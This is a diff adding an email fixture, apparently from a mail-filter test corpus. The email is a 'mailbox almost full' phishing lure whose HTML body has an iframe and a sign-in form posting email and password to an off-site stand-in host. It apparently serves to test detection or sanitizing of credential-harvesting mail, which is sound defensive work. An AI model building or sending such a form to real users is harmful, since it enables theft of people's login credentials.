@@ -1,0 +1,10 @@
+From: Mail Admin <admin@mailbox-help.example>
+To: me@desk.example
+Date: Fri, 13 Nov 2026 10:00:00 +0000
+Subject: Mailbox almost full
+Message-ID: <html-iframe-form@corpus.example>
+MIME-Version: 1.0
+X-Corpus-Note: HTML with an iframe and a credential form posting off-site
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>Your mailbox is almost full. Sign in to keep receiving mail.</p><iframe src="https://frame.example.com/embed" width="600" height="400"></iframe><form action="https://collect.example.net/login" method="post"><input type="text" name="user" placeholder="Email"><input type="password" name="pass"><button type="submit">Sign in</button></form><button formaction="https://collect.example.net/other">Upgrade</button></body></html>
